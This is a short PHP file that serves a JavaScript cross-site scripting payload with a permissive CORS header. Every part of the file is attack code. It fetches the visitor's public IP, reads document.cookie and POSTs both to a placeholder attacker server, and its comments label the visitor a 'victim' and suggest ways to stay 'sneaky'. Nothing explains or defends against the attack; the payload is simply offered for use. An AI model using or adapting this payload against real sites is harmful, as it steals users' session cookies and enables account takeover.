<?php

header('Content-Type: application/javascript'); // wizardry
header('Access-Control-Allow-Origin: *');       // for all of your Cross-Site-Origin problems

?>

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {  // promise wizardry: cant use promise values outside of a promise processing
  console.log(data.ip);                  // victim's IP
  let document_cookie = document.cookie; // victim's cookies

  const xhr = new XMLHttpRequest();
  xhr.open("POST","https://<attack_server_hostname>:<port>",true);               // POST / HTTP/1.1
  var params = 'victim_ip='+data.ip+"&document_cookies="+document_cookie;        // Content-Type: application/x-www-form-urlencoded
  xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');      // victim_ip=xxx.xxx.xxx.xxx&document_cookies=XXXXX=xxxx;YYYY=yyyyy...
  xhr.onreadystatechange = function() {
    if(xhr.readyState == 4 && xhr.status == 200) {                               // flair for attention
      alert('should have locked your cookie jar');                               // comment if you're trying to be sneaky
    }
  }
  xhr.send(params);
  console.log(xhr.status);
});
